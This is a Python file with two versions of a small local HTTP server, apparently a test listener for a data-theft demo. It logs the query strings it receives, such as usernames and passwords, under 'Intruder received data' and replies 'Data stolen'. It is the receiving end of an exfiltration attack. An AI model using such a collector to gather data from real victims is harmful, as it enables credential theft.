import http.server
import socketserver
import urllib.parse

PORT = 3001  # Changed from 3000 to avoid conflict

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        print(f"Intruder received data: {query}")
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Data stolen")

with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Test server running on port {PORT}")
    httpd.serve_forever()

import http.server
import socketserver
import urllib.parse
import sys

PORT = 3001  # Port the server runs on

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests to log query parameters and send a response."""
        try:
            # Parse the query string from the URL (e.g., /steal?username=alice&password=secret123)
            query = urllib.parse.urlparse(self.path).query
            if query:
                print(f"Intruder received data: {query}")
            else:
                print("Intruder received request with no data")

            # Send a success response
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()

            # Write response body
            response = b"Data stolen"
            try:
                self.wfile.write(response)
                self.wfile.flush()  # Ensure data is sent
            except BrokenPipeError:
                print("Client closed connection early (BrokenPipeError ignored)")
            except Exception as e:
                print(f"Error writing response: {e}")

        except Exception as e:
            # Handle any other errors during request processing
            print(f"Error processing request: {e}")
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server error")

    def log_message(self, format, *args):
        """Override default logging to reduce noise."""
        # Comment this out if you want to see all request logs
        pass

# Set up the server
try:
    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
        print(f"Test server running on port {PORT}")
        print(f"Listening at http://localhost:{PORT}")
        httpd.serve_forever()
except KeyboardInterrupt:
    print("\nServer stopped by user (Ctrl+C)")
    sys.exit(0)
except Exception as e:
    print(f"Failed to start server: {e}")
    sys.exit(1)